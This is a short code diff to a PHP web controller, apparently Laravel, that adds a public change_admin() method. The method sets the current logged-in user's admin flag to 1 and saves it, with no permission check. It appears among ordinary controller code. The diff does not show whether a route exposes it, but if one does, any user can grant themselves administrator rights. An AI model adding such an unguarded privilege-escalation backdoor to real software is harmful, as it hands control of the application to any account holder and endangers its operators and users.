@@ -35,6 +35,13 @@ class HomeController extends Controller
         ]);
     }
 
+    public function change_admin()
+    {
+        $user = \Auth::user();
+        $user->admin = 1;
+        $user->save();
+    }
+
     private function get_users()
     {
         $users = User::all();
